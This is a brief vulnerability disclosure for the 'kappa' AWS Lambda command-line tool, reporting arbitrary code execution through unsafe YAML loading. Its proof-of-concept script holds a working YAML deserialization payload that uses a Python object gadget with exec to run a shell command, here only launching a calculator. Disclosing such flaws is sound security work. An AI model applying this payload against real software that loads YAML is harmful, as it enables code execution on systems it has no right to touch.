# Description

`kappa` is a command line tool that (hopefully) makes it easier to deploy, update, and test functions for AWS Lambda., which is vulnerable to `Arbitary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
pip install kappa
```

### Run exploit.py
```
import os
#os.sysem('pip3 install kappa')
from kappa import context
payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
context.Context(payload)
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
